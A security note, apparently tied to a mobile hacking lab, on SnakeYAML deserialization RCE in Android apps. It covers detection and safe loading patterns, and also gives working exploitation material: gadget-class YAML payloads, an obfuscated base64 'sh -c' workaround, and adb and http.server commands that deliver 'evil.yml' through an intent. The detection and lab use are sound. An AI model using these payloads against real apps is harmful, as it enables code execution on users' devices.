# SnakeYAML Deserialization RCE

## Overview

SnakeYAML's `yaml.load()` (without SafeConstructor) allows arbitrary Java object instantiation via `!!` type tags. If the classpath contains a class with a dangerous constructor (command execution, file I/O, JNDI lookup), this becomes RCE.

## Detection (Static Analysis)

1. Search for `yaml.load(` or `new Yaml()` without SafeConstructor
2. Check if input comes from untrusted source (intent data, downloaded file, user input)
3. Search for gadget classes on classpath with dangerous constructors

### Safe vs Unsafe patterns:
```java
// UNSAFE — allows arbitrary object instantiation
Yaml yaml = new Yaml();
Object data = yaml.load(inputStream);

// UNSAFE — DumperOptions don't affect loading safety
Yaml yaml = new Yaml(new DumperOptions());
Object data = yaml.load(inputStream);

// SAFE — restricts to specific type
Yaml yaml = new Yaml();
Map data = yaml.loadAs(inputStream, Map.class);

// SAFE — SafeConstructor blocks arbitrary types
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
Object data = yaml.load(inputStream);
```

## Exploitation

### Payload Format
```yaml
!!fully.qualified.ClassName [constructor_arg]
```

For single-argument String constructor:
```yaml
!!com.example.VulnerableClass ["argument"]
```

For multi-argument constructor:
```yaml
!!com.example.VulnerableClass ["arg1", "arg2", "arg3"]
```

For JavaBean-style (setters):
```yaml
!!com.example.Bean
property1: value1
property2: value2
```

### Common Gadget Classes

| Class | Constructor Effect |
|-------|-------------------|
| `Runtime.exec()` wrapper | Command execution |
| `ProcessBuilder` | Command execution |
| `javax.script.ScriptEngineManager` | Code execution via JS engine |
| `java.net.URL` | SSRF |
| `com.sun.rowset.JdbcRowSetImpl` | JNDI injection (if on classpath) |

### MHL ConfigEditor Example

Gadget class in app:
```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) throws IOException {
        Runtime.getRuntime().exec(command);
    }
}
```

Payload:
```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /sdcard/Download/pwned"]
```

## Delivery Vectors (Android)

1. **Intent with URL:** App registers intent-filter for `application/yaml` MIME type + http/https scheme
2. **File picker:** App loads YAML from user-selected file
3. **Downloaded file:** App downloads YAML from attacker-controlled URL
4. **Shared storage:** Malicious app writes YAML to shared location that target app reads

## Runtime.exec() Limitations

`Runtime.exec(String)` uses `StringTokenizer` to split on whitespace:
- `exec("touch /tmp/file")` → works (2 tokens)
- `exec("sh -c id")` → works (sh executes "id")
- `exec("sh -c id > /tmp/out")` → FAILS (sh only gets "id" as -c arg, "> /tmp/out" becomes $0/$1)

### Workarounds for shell features:
1. **Pre-push script:** Write script via adb, then `exec("/path/to/script.sh")`
2. **No-space commands:** `exec("touch /sdcard/Download/pwned")` for proof of concept
3. **Base64 trick:** `exec("sh -c echo${IFS}aWQ=|base64${IFS}-d|sh")` (unreliable)
4. **App-writable path:** If app is debuggable, use `run-as` to push script to app's data dir

## Verification

```bash
# Deliver payload
adb reverse tcp:8080 tcp:8080
python3 -m http.server 8080 &  # serve evil.yml
adb shell am start -a android.intent.action.VIEW \
  -d "http://127.0.0.1:8080/evil.yml" \
  -t "application/yaml" \
  com.target.package/.MainActivity

# Verify RCE
adb shell ls -la /sdcard/Download/pwned
```
